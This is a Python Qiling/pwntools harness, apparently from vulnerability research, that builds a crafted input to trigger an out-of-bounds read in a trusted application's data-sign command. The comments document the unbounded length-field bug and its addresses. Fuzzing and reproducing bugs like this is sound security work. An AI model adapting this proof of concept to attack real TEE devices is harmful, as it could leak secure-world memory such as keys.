from .params import *
from pwn import *
from qiling import Qiling
import struct, os

# === MITD new bug: unbounded length-READ offset -> OOB read (distinct from F10) ==
# Target: klee mitd 8aaaf201-2460-0010-aabbccdd00000008 (S16-pinned, sha 7157cd65…).
# cmd 0x9002 (data sign) -> mitd_data_sign @0x21CE0. Same gate as F10:
#   paramTypes==0x65 ; params[0].size==0x2000 (INPUT) ; params[1].size==0x1000 (OUTPUT).
#   handler: x0 = IN+0x10 (content base), w1 = *(u32*)(IN+8) (in_len), x2=OUT+0x10.
#
# BUG (mitd_data_sign, reads via helper sub_23668 = `ldr w0,[x0]; ret` -- NO BOUND):
#   nonce_len = read_u32(content + 0)                         @0x21e90
#   pkg_len   = read_u32(content + nonce_len + 4)             @0x21e9c  <-- OOB if nonce_len big
#   extra_len = read_u32(content + nonce_len + 8 + pkg_len)   @0x21eb8  <-- OOB if big
#   in_len (w1) is checked NON-ZERO (cbz w1) but is NEVER used to bound these offsets.
#   => a large nonce_len makes the pkg_len read land at content+nonce_len+4, walking
#      off the 0x2000 INPUT buffer into adjacent TEE memory = OOB READ of secure-world
#      memory. This is DISTINCT from F10 (F10 = 32-bit overflow of the length SUM ->
#      undersized malloc -> OOB write). Here the bug is the unbounded READ offset.
#
# CRAFT: content @ IN+0x10 = [u32 nonce_len = BIG]. With nonce_len ~ 0x2000, the
#   pkg_len read at content + 0x2004 is past the redzoned 0x2000 INPUT -> asan OOB read.
# We keep the IN+8 in_len plausible (it is not used as a bound, but must be non-zero).

CMD = 0x9002
PTYPES = 0x65
INSZ = 0x2000
OUTSZ = 0x1000

NONCE_LEN = int(os.environ.get("OOBR_NONCE", str(0x4000)), 0) & 0xFFFFFFFF

def _build(nonce_len):
    # content @ IN+0x10: just the nonce_len u32 (the OOB happens on the SECOND read,
    # at content + nonce_len + 4, before any nonce bytes are even needed).
    content = struct.pack("<I", nonce_len)
    header = b"\x00"*8 + struct.pack("<I", INSZ - 0x10) + b"\x00"*4   # in_len plausible, non-zero
    buf = (header + content)[:INSZ].ljust(INSZ, b"\x00")
    return buf

def place_input_callback(ql: Qiling, input: bytes, _: int):
    nonce_len = NONCE_LEN
    if "OOBR_NONCE" not in os.environ and len(input) >= 4:
        # AFL drives nonce_len; bias toward values >= 0xFF0 (off-buffer)
        nonce_len = struct.unpack_from("<I", input, 0)[0]
    buf = _build(nonce_len)
    print(f"[MITD-OOBR] cmd=0x9002 nonce_len={nonce_len:#x} "
          f"(pkg_len read at content+nonce_len+4; OOB past 0x{INSZ:x} INPUT when big)")
    command_params = [
        MemRefParam(buf, INSZ),            # param0 INPUT (redzoned 0x2000)
        MemRefParam(bytes(OUTSZ), OUTSZ),  # param1 OUTPUT (redzoned)
        NoneParam(),
        NoneParam(),
    ]
    setup_params_fuzz(ql, CMD, PTYPES, command_params)
    return True
